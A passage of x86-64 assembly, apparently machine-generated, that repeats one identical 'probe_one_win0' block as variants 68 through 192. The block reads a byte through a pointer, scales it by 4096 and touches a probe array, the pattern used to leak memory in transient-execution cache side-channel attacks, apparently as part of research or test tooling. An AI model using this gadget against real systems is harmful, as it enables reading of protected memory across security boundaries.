	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 68
.Lprobe_one_win0_var68:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 69
.Lprobe_one_win0_var69:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 70
.Lprobe_one_win0_var70:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 71
.Lprobe_one_win0_var71:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 72
.Lprobe_one_win0_var72:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 73
.Lprobe_one_win0_var73:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 74
.Lprobe_one_win0_var74:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 75
.Lprobe_one_win0_var75:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 76
.Lprobe_one_win0_var76:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 77
.Lprobe_one_win0_var77:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 78
.Lprobe_one_win0_var78:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 79
.Lprobe_one_win0_var79:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 80
.Lprobe_one_win0_var80:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 81
.Lprobe_one_win0_var81:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 82
.Lprobe_one_win0_var82:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 83
.Lprobe_one_win0_var83:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 84
.Lprobe_one_win0_var84:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 85
.Lprobe_one_win0_var85:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 86
.Lprobe_one_win0_var86:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 87
.Lprobe_one_win0_var87:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 88
.Lprobe_one_win0_var88:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 89
.Lprobe_one_win0_var89:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 90
.Lprobe_one_win0_var90:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 91
.Lprobe_one_win0_var91:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 92
.Lprobe_one_win0_var92:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 93
.Lprobe_one_win0_var93:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 94
.Lprobe_one_win0_var94:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 95
.Lprobe_one_win0_var95:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 96
.Lprobe_one_win0_var96:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 97
.Lprobe_one_win0_var97:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 98
.Lprobe_one_win0_var98:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 99
.Lprobe_one_win0_var99:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 100
.Lprobe_one_win0_var100:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 101
.Lprobe_one_win0_var101:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 102
.Lprobe_one_win0_var102:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 103
.Lprobe_one_win0_var103:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 104
.Lprobe_one_win0_var104:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 105
.Lprobe_one_win0_var105:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 106
.Lprobe_one_win0_var106:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 107
.Lprobe_one_win0_var107:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 108
.Lprobe_one_win0_var108:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 109
.Lprobe_one_win0_var109:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 110
.Lprobe_one_win0_var110:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 111
.Lprobe_one_win0_var111:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 112
.Lprobe_one_win0_var112:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 113
.Lprobe_one_win0_var113:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 114
.Lprobe_one_win0_var114:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 115
.Lprobe_one_win0_var115:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 116
.Lprobe_one_win0_var116:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 117
.Lprobe_one_win0_var117:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 118
.Lprobe_one_win0_var118:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 119
.Lprobe_one_win0_var119:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 120
.Lprobe_one_win0_var120:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 121
.Lprobe_one_win0_var121:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 122
.Lprobe_one_win0_var122:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 123
.Lprobe_one_win0_var123:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 124
.Lprobe_one_win0_var124:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 125
.Lprobe_one_win0_var125:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 126
.Lprobe_one_win0_var126:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 127
.Lprobe_one_win0_var127:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 128
.Lprobe_one_win0_var128:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 129
.Lprobe_one_win0_var129:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 130
.Lprobe_one_win0_var130:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 131
.Lprobe_one_win0_var131:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 132
.Lprobe_one_win0_var132:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 133
.Lprobe_one_win0_var133:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 134
.Lprobe_one_win0_var134:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 135
.Lprobe_one_win0_var135:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 136
.Lprobe_one_win0_var136:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 137
.Lprobe_one_win0_var137:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 138
.Lprobe_one_win0_var138:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 139
.Lprobe_one_win0_var139:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 140
.Lprobe_one_win0_var140:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 141
.Lprobe_one_win0_var141:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 142
.Lprobe_one_win0_var142:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 143
.Lprobe_one_win0_var143:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 144
.Lprobe_one_win0_var144:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 145
.Lprobe_one_win0_var145:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 146
.Lprobe_one_win0_var146:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 147
.Lprobe_one_win0_var147:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 148
.Lprobe_one_win0_var148:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 149
.Lprobe_one_win0_var149:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 150
.Lprobe_one_win0_var150:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 151
.Lprobe_one_win0_var151:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 152
.Lprobe_one_win0_var152:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 153
.Lprobe_one_win0_var153:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 154
.Lprobe_one_win0_var154:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 155
.Lprobe_one_win0_var155:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 156
.Lprobe_one_win0_var156:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 157
.Lprobe_one_win0_var157:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 158
.Lprobe_one_win0_var158:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 159
.Lprobe_one_win0_var159:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 160
.Lprobe_one_win0_var160:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 161
.Lprobe_one_win0_var161:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 162
.Lprobe_one_win0_var162:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 163
.Lprobe_one_win0_var163:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 164
.Lprobe_one_win0_var164:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 165
.Lprobe_one_win0_var165:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 166
.Lprobe_one_win0_var166:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 167
.Lprobe_one_win0_var167:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 168
.Lprobe_one_win0_var168:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 169
.Lprobe_one_win0_var169:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 170
.Lprobe_one_win0_var170:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 171
.Lprobe_one_win0_var171:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 172
.Lprobe_one_win0_var172:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 173
.Lprobe_one_win0_var173:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 174
.Lprobe_one_win0_var174:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 175
.Lprobe_one_win0_var175:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 176
.Lprobe_one_win0_var176:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 177
.Lprobe_one_win0_var177:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 178
.Lprobe_one_win0_var178:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 179
.Lprobe_one_win0_var179:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 180
.Lprobe_one_win0_var180:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 181
.Lprobe_one_win0_var181:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 182
.Lprobe_one_win0_var182:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 183
.Lprobe_one_win0_var183:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 184
.Lprobe_one_win0_var184:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 185
.Lprobe_one_win0_var185:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 186
.Lprobe_one_win0_var186:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 187
.Lprobe_one_win0_var187:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 188
.Lprobe_one_win0_var188:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 189
.Lprobe_one_win0_var189:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 190
.Lprobe_one_win0_var190:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 191
.Lprobe_one_win0_var191:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 192
.Lprobe_one_win0_var192:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 193
.Lprobe_one_win0_var193:
